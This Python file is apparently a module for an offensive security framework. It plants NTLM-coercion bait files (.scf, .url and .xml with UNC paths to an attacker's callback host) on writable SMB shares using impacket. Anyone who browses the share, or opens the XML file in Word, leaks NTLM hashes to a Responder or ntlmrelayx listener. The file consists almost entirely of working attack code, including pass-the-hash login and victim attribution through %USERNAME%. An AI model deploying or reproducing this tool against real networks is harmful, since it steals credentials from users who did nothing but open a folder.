"""Hash bait: drop NTLM-coercion files on writable SMB shares.

Any account that BROWSES the share auto-authenticates to your listener
(Responder/ntlmrelayx on CALLBACK) — no clicks, no exploits, just file
formats Windows resolves eagerly:

  - .scf: Explorer resolves the IconFile UNC the moment the folder is
    RENDERED. The zero-click classic.
  - .url: same icon resolution, but the IconFile path carries a literal
    %USERNAME% — expanded on the VICTIM's machine, so the inbound
    connection path names the user who browsed. Free attribution.
  - .xml: an xml-stylesheet UNC — fires when the doc is opened in Word.
    Needs a click, but triggers from a different app and survives
    "don't browse shares" hygiene.

Files are generated IN MEMORY and pushed with impacket (no litter on the
operator box). Names are @-prefixed so they sort to the top of directory
listings. CLEAN deletes exactly the artifacts this module would drop.

Workflow: hash_bait to drop -> responder -I <iface> (or ntlmrelayx) on
CALLBACK -> hashes land. hash_bait CLEAN=true when done.
"""

import io

from core.module import AuxiliaryModule
from core.options import OptAddress, OptBool, OptPort, OptString

try:
    from impacket.smbconnection import SMBConnection
except ImportError:
    SMBConnection = None  # console gates run() on requirements

PAYLOAD_KINDS = ("scf", "url", "xml")


def make_scf(callback):
    """Explorer zero-click: renders the folder, resolves the icon UNC."""
    return ("[Shell]\n"
            "Command=2\n"
            f"IconFile=\\\\{callback}\\tools\\nc.ico\n"
            "[Taskbar]\n"
            "Command=ToggleDesktop\n")


def make_url(callback):
    """Like .scf, but %USERNAME% expands on the VICTIM — the inbound
    connection path tells you exactly who browsed the share."""
    return ("[InternetShortcut]\n"
            f"IconFile=\\\\{callback}\\%USERNAME%.icon\n")


def make_xml(callback):
    """xml-stylesheet UNC: fires when the doc is opened (Word via the
    mso-application PI). Click required, different trigger app."""
    return ("<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n"
            "<?mso-application progid=\"Word.Document\"?>\n"
            f"<?xml-stylesheet type=\"text/xsl\" href=\"\\\\{callback}\\bait.xsl\"?>\n"
            "<root/>\n")


BUILDERS = {"scf": make_scf, "url": make_url, "xml": make_xml}


class HashBait(AuxiliaryModule):
    name = "Hash Bait (NTLM coercion files)"
    description = """
        Drops NTLM-coercion bait files (.scf/.url/.xml) on a writable SMB
        share. Anyone browsing the share authenticates to CALLBACK — run
        Responder/ntlmrelayx there. The .url payload embeds %USERNAME%
        for per-user attribution. Generated in memory, @-prefixed to
        sort first, SUBDIR for writable nested directories, CLEAN=true
        deletes exactly the dropped artifacts. NTHASH works for auth.
    """
    authors = ["you"]
    requirements = ["impacket"]

    def register_options(self):
        self.options.add(OptAddress("RHOSTS", required=True,
                                    description="Target host(s), comma-separated"))
        self.options.add(OptPort("RPORT", default=445, description="SMB port"))
        self.options.add(OptString("DOMAIN", default=".",
                                   description="Auth domain ('.' = local account)"))
        self.options.add(OptString("USERNAME", default="",
                                   description="Username (blank = null session)"))
        self.options.add(OptString("PASSWORD", default="", description="Password"))
        self.options.add(OptString("NTHASH", default="",
                                   description="NT hash, hex (overrides PASSWORD)"))
        self.options.add(OptString("SHARE", required=True,
                                   description="Share to bait (must be writable)"))
        self.options.add(OptString("SUBDIR", default="",
                                   description="Subdirectory on the share "
                                               "(share root read-only but a "
                                               "nested dir writable — common)"))
        self.options.add(OptString("CALLBACK", default="",
                                   description="Your listener IP/hostname "
                                   "(required unless CLEAN)"))
        self.options.add(OptString("PAYLOADS", default="scf,url,xml",
                                   description="Bait kinds, comma-separated "
                                               "(scf,url,xml)"))
        self.options.add(OptString("BASENAME", default="@bait",
                                   description="Base filename (@ sorts first)"))
        self.options.add(OptBool("CLEAN", default=False,
                                 description="Delete the bait instead of dropping it"))

    def _login(self, host):
        conn = SMBConnection(host, host, sess_port=int(self.get_option("RPORT")),
                             timeout=30)
        user = str(self.get_option("USERNAME") or "")
        domain = str(self.get_option("DOMAIN") or ".")
        nthash = str(self.get_option("NTHASH") or "").strip()
        if nthash:
            conn.login(user, "", domain, "", nthash)
        else:
            conn.login(user, str(self.get_option("PASSWORD") or ""), domain)
        return conn

    def _artifacts(self):
        base = str(self.get_option("BASENAME") or "@bait").lstrip("\\")
        subdir = str(self.get_option("SUBDIR") or "").strip("\\/")
        prefix = f"{subdir}\\" if subdir else ""
        kinds = [k.strip() for k in str(self.get_option("PAYLOADS")).split(",")
                 if k.strip() in PAYLOAD_KINDS]
        return [(kind, f"{prefix}{base}.{kind}") for kind in kinds]

    def run(self):
        callback = str(self.get_option("CALLBACK") or "").strip()
        clean = bool(self.get_option("CLEAN"))
        if not callback and not clean:
            self.print_error("CALLBACK is required (your listener address)")
            return
        artifacts = self._artifacts()
        if not artifacts:
            self.print_error(f"PAYLOADS must be among {PAYLOAD_KINDS}")
            return
        share = str(self.get_option("SHARE"))
        for host in [h.strip() for h in str(self.get_option("RHOSTS")).split(",")
                     if h.strip()]:
            try:
                conn = self._login(host)
            except Exception as e:
                self.print_error(f"{host}: SMB login failed - {e}")
                continue
            try:
                if clean:
                    self._clean(host, conn, share, artifacts)
                else:
                    self._drop(host, conn, share, artifacts, callback)
            finally:
                conn.close()

    def _drop(self, host, conn, share, artifacts, callback):
        store = getattr(self.framework, "store", None)
        dropped = []
        for kind, path in artifacts:
            content = BUILDERS[kind](callback).encode()
            try:
                conn.putFile(share, path, io.BytesIO(content).read)
            except Exception as e:
                self.print_error(f"{host}: {share}\\{path}: drop failed "
                                 f"(share writable?) - {e}")
                continue
            # verify it actually landed
            try:
                conn.getFile(share, path, io.BytesIO().write)
                self.print_good(f"{host}: bait {share}\\{path} -> "
                                f"\\\\{callback} ({kind})")
                dropped.append(path)
            except Exception:
                self.print_error(f"{host}: {share}\\{path}: wrote but "
                                 f"can't read back?!")
        if store is not None and dropped:
            store.add_loot(
                "bait", f"coercion files @ {host}\\{share}",
                f"callback={callback}\n" + "\n".join(dropped),
                address=host)
            self.print_status("Drop recorded ('loot bait' to review; "
                              "CLEAN=true to remove)")
        if dropped:
            self.print_status(f"{host}: start the listener — "
                              f"responder -I <iface> / ntlmrelayx on {callback}")

    def _clean(self, host, conn, share, artifacts):
        removed = 0
        for kind, path in artifacts:
            try:
                conn.deleteFile(share, path)
                removed += 1
                self.print_good(f"{host}: removed {share}\\{path}")
            except Exception as e:
                self.print_debug(f"{host}: {share}\\{path}: {e}")
        self.print_status(f"{host}: {removed}/{len(artifacts)} bait "
                          f"file(s) removed")
